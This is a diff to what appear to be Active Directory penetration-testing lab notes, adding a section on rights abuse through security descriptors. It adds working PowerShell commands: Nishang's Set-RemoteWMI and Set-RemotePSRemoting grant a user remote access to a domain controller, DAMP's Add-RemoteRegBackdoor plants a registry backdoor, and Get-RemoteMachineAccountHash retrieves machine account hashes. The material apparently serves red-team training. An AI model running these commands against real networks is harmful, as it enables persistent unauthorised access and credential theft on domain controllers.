@@ -367,12 +367,46 @@ Get-ObjectAcl -Identity Josh -ResolveGUIDs | Foreach-Object {$_ | Add-Member -No
 ```
 
 * * * 
+
+# Rights Abuse - Security Descriptors
+
+
 #### Remote WMI - Nishang
-link to Nishang
+link to Nishang-
+
+```
+. .\Set-RemoteWMI.ps1
+
+Set-RemoteWMI -UserName studentx -ComputerName dcorp- dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose
+
+gwmi -class win32_operatingsystem -ComputerName dcorp- dc.dollarcorp.moneycorp.local
+```
+
+
 #### PS Remoting
-link to Nishang
+link to Nishang -
+
+```
+. .\Set-RemotePSRemoting.ps1
+
+Set-RemotePSRemoting -UserName studentx -ComputerName dcorp- dc.dollarcorp.moneycorp.local -Verbose
+```
+
 #### Remote Registry - DAMP
-link to DAMP
+link to DAMP -
+
+```
+. .\DAMP-master\Add-RemoteRegBackdoor.ps1
+
+Add-RemoteRegBackdoor -ComputerName dcorp- dc.dollarcorp.moneycorp.local -Trustee studentx -Verbose
+```
+
+```
+. .\DAMP-master\RemoteHashRetrieval.ps1
+
+Get-RemoteMachineAccountHash -ComputerName dcorp- dc.dollarcorp.moneycorp.local -Verbose
+```
+
 
 #Kerberoasting
 
